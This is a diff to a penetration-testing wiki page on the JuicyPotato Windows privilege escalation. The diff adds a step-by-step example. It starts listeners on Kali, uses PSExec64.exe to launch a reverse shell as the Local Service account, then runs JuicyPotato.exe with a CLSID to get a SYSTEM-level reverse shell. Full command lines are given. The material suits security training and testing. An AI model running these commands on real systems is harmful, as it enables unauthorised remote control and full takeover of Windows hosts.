@@ -28,6 +28,7 @@ You can check their website and try their engine for **free** at:
 {% embed url="https://whiteintel.io" %}
 
 ***
+![hot potato]()
 
 {% hint style="warning" %}
 **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. _**Check:**_
@@ -110,6 +111,13 @@ The actual solution is to protect sensitive accounts and applications which run 
 From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
 ## Examples
+1. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to windows 
+2. Start a listener on Kali.
+3. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
+`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+4. Start another listener on Kali.
+5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
+`C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}`
 
 Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.
 
